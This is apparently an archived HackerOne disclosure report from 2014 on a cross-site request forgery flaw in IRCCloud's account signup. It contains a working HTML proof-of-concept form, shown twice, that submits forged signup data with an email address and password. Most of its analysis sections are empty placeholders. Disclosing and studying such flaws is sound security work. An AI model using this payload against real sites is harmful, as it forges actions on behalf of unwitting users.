#  User Account Creation CSRF 

## Metadata
- **Source:** HackerOne
- **Report:** 7051 | https://hackerone.com/reports/7051
- **Submitted:** 2014-04-11
- **Reporter:** chandrakant
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Any One Account Can be created and display home screen 
<html>
  <!-- CSRF PoC chandrakant->
  <body>
    <form action="https://www.irccloud.com/chat/signup" method="POST">
      <input type="hidden" name="email" value="chandra.kantnial8&#64;gmail&#46;com" />
      <input type="hidden" name="password" value="chandra1" />
      <input type="hidden" name="realname" value="chandrakant1" />
  

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Any One Account Can be created and display home screen 
<html>
  <!-- CSRF PoC chandrakant->
  <body>
    <form action="https://www.irccloud.com/chat/signup" method="POST">
      <input type="hidden" name="email" value="chandra.kantnial8&#64;gmail&#46;com" />
      <input type="hidden" name="password" value="chandra1" />
      <input type="hidden" name="realname" value="chandrakant1" />
      <input type="hidden" name="invite" value="" />
      <input type="hidden" name="org&#95;invite" value="" />
      <input type="hidden" name="&#95;reqid" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Please Fix this


</details>

---
*Analysed by Claude on 2026-05-24*
